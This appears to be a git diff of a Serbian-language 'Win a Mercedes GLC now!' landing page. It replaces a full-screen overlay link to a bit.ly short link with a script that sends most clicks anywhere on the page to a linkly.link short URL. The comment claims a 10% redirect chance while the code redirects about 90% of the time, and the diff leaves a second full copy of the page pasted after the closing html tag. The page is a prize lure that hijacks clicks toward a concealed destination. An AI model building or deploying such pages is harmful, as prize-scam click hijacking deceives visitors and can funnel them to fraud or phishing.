@@ -1,4 +1,4 @@
- <!doctype html>
+<!doctype html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
@@ -24,13 +24,6 @@
         background-repeat: no-repeat;
       }
 
-      /* FULL PAGE CLICK OVERLAY */
-      .full-link {
-        position: fixed;
-        inset: 0;
-        z-index: 1;
-      }
-
       /* ===== DESKTOP POSITION ===== */
       .content-box {
         position: absolute;
@@ -44,7 +37,6 @@
         text-align: left;
         gap: 1.25rem;
         z-index: 2;
-        pointer-events: none;
       }
 
       .main-heading {
@@ -60,7 +52,7 @@
       /* ===== MOBILE ===== */
       @media (max-width: 768px) {
         body {
-          background-image: url("landingpage%20mobile.jpg");
+          background-image: url("landingpage mobile.jpg");
         }
 
         .content-box {
@@ -83,16 +75,123 @@
 
   <body>
 
-    <!-- FULL PAGE REDIRECT LINK -->
-    <a
-      href="https://bit.ly/4raVpLP"
-      class="full-link"
-      aria-label="Klikni za učešće"
-    ></a>
+    <div class="content-box">
+      <h1 class="main-heading">Osvoji Mercedes GLC SAD!</h1>
+    </div>
+
+    <script>
+      let redirected = false;
+
+      document.addEventListener("click", function () {
+        if (redirected) return;
+
+        const chance = Math.random();
+
+        // 10% šanse za redirect
+        if (chance < 0.9) {
+          redirected = true;
+          window.location.href = "https://linkly.link/2e1gs";
+        }
+      });
+    </script>
+
+  </body>
+</html><!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Osvoji Mercedes GLC SAD!</title>
+
+    <style>
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+        font-family: Arial, sans-serif;
+      }
+
+      body {
+        position: relative;
+        background-image: url("landingpagedesctop.jpg");
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+      }
+
+      /* ===== DESKTOP POSITION ===== */
+      .content-box {
+        position: absolute;
+        top: 6%;
+        left: 5%;
+        width: 40%;
+        max-width: 520px;
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+        text-align: left;
+        gap: 1.25rem;
+        z-index: 2;
+      }
+
+      .main-heading {
+        font-size: 5rem;
+        font-weight: 900;
+        color: #ffffff;
+        text-shadow:
+          0 0 1.125rem rgba(0, 123, 255, 1),
+          0 0 2rem rgba(0, 123, 255, 0.8);
+        margin: 0;
+      }
+
+      /* ===== MOBILE ===== */
+      @media (max-width: 768px) {
+        body {
+          background-image: url("landingpage mobile.jpg");
+        }
+
+        .content-box {
+          top: 6%;
+          left: 50%;
+          transform: translateX(-50%);
+          width: 90%;
+          max-width: none;
+          align-items: center;
+          text-align: center;
+        }
+
+        .main-heading {
+          font-size: 3.4rem;
+          line-height: 0.95;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
 
     <div class="content-box">
       <h1 class="main-heading">Osvoji Mercedes GLC SAD!</h1>
     </div>
+
+    <script>
+      let redirected = false;
+
+      document.addEventListener("click", function () {
+        if (redirected) return;
+
+        const chance = Math.random();
+
+        // 10% šanse za redirect
+        if (chance < 0.9) {
+          redirected = true;
+          window.location.href = "https://linkly.link/2e1gs";
+        }
+      });
+    </script>
 
   </body>
 </html>
